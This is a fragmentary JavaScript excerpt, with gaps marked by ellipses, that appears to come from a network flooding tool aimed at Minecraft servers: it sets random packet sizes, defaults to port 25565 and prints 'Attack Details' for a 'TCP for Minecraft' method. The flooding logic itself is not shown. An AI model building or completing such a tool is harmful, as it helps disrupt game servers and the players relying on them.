...
const packetSize = size ? parseInt(size) : Math.floor(Math.random() * (1500 - 1)) + 1;
const targetPort = port ? parseInt(port) : 25565; // Default Minecraft port
...
const printAttackDetails = () => {
    ...
    console.log(centerText("Attack Details", width));
    ...
    console.log(centerText(` Method: TCP for Minecraft`, width));
